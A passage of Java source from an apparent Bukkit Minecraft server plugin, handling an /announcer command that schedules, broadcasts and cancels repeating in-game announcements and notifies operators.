                    }
                } else if (args.length == 1) {
                    if (args[0].equalsIgnoreCase("cancel")) {
                        for (Player p : Bukkit.getOnlinePlayers()) {
                            if (p.isOp()) {
                                p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has canceled the announcement.");
                            }
                        }
                        Bukkit.getScheduler().cancelTask(task);
                        return true;
                    }
                } else {
                    sender.sendMessage(ChatColor.RED + "Usage: /announcer [minutes] [message]");
                    return true;
                }
                task = Bukkit.getServer().getScheduler()
                        .scheduleSyncRepeatingTask(plg, new Runnable() {
                            public void run() {
                                Bukkit.getServer().broadcastMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "Announcement" + ChatColor.DARK_GRAY + "] " + ChatColor.RESET + announcement);
                            }
                        }, delay, delay);
            }
        }
        return true;
    }
}
